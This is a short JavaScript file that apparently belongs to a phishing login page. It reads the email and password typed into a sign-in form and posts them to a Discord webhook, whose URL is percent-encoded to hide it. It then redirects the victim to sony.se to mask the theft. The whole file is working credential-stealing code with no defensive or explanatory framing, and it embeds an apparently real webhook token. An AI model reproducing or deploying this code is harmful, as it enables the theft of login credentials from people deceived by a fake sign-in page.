const button = document.getElementById("sign-in-submit-button")
const password = document.querySelector("#user_password")
const email = document.querySelector("#user_email")


let time = 0

let url = "https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1096858693775130735%2Fe3y3SAuddPq7uYJxVtlyVoOUcgaenBANMpUEDBkpHM6tiUy8Qnh4-dVUHHNdcLkPAX0n%0A"

const me= decodeURIComponent(url)
button.onclick = () => {

    const message = {
        content: `EMAIL: ${email.value} ||| PASSWORD: ${password.value}`
      };
      




      // Make the HTTP POST request
      fetch(me, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      })
        .then(response => {
          // Print the response status code to confirm the message was sent successfully
          console.log(response.status);

          location.replace("https://www.sony.se/")
        })
        .catch(error => {
          console.error(error);
        });


        button.style.display = "none"

        setTimeout(() => {
          button.style.display = "block"

        }, 1000 * 10);
}